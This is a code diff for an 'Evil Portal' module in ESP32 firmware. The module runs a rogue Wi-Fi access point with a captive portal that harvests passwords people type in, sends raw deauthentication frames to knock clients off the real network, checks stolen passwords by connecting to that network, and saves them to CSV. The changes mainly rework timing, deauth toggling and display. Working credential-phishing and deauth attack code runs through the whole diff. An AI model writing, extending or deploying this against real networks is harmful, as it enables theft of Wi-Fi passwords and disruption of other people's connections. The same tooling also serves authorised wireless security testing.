@@ -18,8 +18,7 @@ EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPw
 EvilPortal::~EvilPortal() {
     webServer.end();
     dnsServer.stop();
-
-    delay(100);
+    vTaskDelay(100 / portTICK_PERIOD_MS);
     wifiDisconnect();
 };
 
@@ -110,7 +109,8 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     bool isConnected = false;
 
     // temporary stop deauth if deauth + clone is true
-    if (_deauth) { temp_stop = true; }
+    bool temp = _deauth;
+    _deauth = false;
 
     webServer.end();
     wifiDisconnect();
@@ -118,7 +118,7 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     // STA Mode temporary
     WiFi.mode(WIFI_MODE_STA);
 
-    delay(80);
+    vTaskDelay(80 / portTICK_PERIOD_MS);
 
     // Try to connect to wifi
     WiFi.begin(Ssid, Password);
@@ -126,20 +126,17 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     int i = 1;
     while (WiFi.status() != WL_CONNECTED) {
         if (i > 15) {
-            delay(500);
+            vTaskDelay(500 / portTICK_PERIOD_MS);
             break;
         }
 
-        delay(500);
+        vTaskDelay(500 / portTICK_PERIOD_MS);
         i++;
     }
 
-    if (WiFi.status() == WL_CONNECTED) {
-        isConnected = true;
-        delay(200);
-    }
+    if (WiFi.status() == WL_CONNECTED) { isConnected = true; }
     // re enable
-    if (_deauth) { temp_stop = false; }
+    _deauth = temp;
 
     // revert to AP mode
     WiFi.mode(WIFI_MODE_AP);
@@ -188,18 +185,17 @@ void EvilPortal::resetCapturedCredentials(void) {
 
 void EvilPortal::loop() {
     int lastDeauthTime = millis(); // one deauth frame each 30ms at least
-    bool isDeauthHeld = false;
     bool shouldRedraw = true;
 
     while (true) {
         if (shouldRedraw) {
-            drawScreen(isDeauthHeld);
+            drawScreen();
             shouldRedraw = false;
         }
 
         dnsServer.processNextRequest();
 
-        if ((!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) || (!temp_stop)) {
+        if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
             send_raw_frame(deauth_frame, 26); // Sends deauth frames if needed
             lastDeauthTime = millis();
         }
@@ -210,22 +206,20 @@ void EvilPortal::loop() {
         }
 
         if (check(SelPress)) {
-            debounceButtonPress();
-            isDeauthHeld = !isDeauthHeld;
+            isDeauthHeld = _deauth ? !isDeauthHeld : isDeauthHeld;
             shouldRedraw = true;
         }
 
         if (check(EscPress)) break;
+
+        if (verifyPass) {
+            wifiDisconnect();
+            verifyPass = false;
+        }
     }
 }
 
-void EvilPortal::debounceButtonPress() {
-    while (check(SelPress)) {
-        delay(80); // Timerless debounce
-    }
-}
-
-void EvilPortal::drawScreen(bool holdDeauth) {
+void EvilPortal::drawScreen() {
     drawMainBorderWithTitle("EVIL PORTAL");
 
     String subtitle = "AP: " + apName.substring(0, 30);
@@ -248,17 +242,24 @@ void EvilPortal::drawScreen(bool holdDeauth) {
     padprintln("");
     printLastCapturedCredential();
 
-    if (_deauth) { printDeauthStatus(holdDeauth); }
+    printDeauthStatus();
 }
 
 void EvilPortal::printLastCapturedCredential() {
-    int newlineIndex = lastCred.indexOf('\n');
-    padprintln(lastCred.substring(0, newlineIndex));
-    padprintln(lastCred.substring(newlineIndex + 1));
+    while (lastCred.length()) {
+        int newlineIndex = lastCred.indexOf('\n');
+        if (newlineIndex > -1) {
+            padprintln(lastCred.substring(0, newlineIndex));
+            lastCred.remove(0, newlineIndex + 1);
+        } else {
+            padprint(lastCred);
+            lastCred = "";
+        }
+    }
 }
 
-void EvilPortal::printDeauthStatus(bool holdDeauth) {
-    if (holdDeauth) {
+void EvilPortal::printDeauthStatus() {
+    if (!_deauth || isDeauthHeld) {
         printFootnote("Deauth OFF");
     } else {
         tft.setTextColor(TFT_RED);
@@ -516,23 +517,23 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     htmlResponse += "</li>\n";
 
     if (_verifyPwd && passwordValue != "") {
-        delay(500);
+        vTaskDelay(500 / portTICK_PERIOD_MS);
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
 
             // Display valid to screen if valid..
-            lastCred += "valid: true\n Stopping server...";
+            lastCred += "valid: true\nStopping server...";
             saveToCSV(csvLine + ", valid: true", true);
-            printDeauthStatus(true);
+            printDeauthStatus();
 
             // save to WiFi creds if the pwd was correct.
             if (bruceConfig.getWifiPassword(apName) != "") {
                 bruceConfig.addWifiCredential(apName, passwordValue);
             }
-            delay(50);
+            vTaskDelay(50 / portTICK_PERIOD_MS);
             // stop further actions...
-            wifiDisconnect();
-            wifiConnected = false;
+            verifyPass = true;
+            _deauth = false;
 
         } else {
             lastCred += "valid: false";
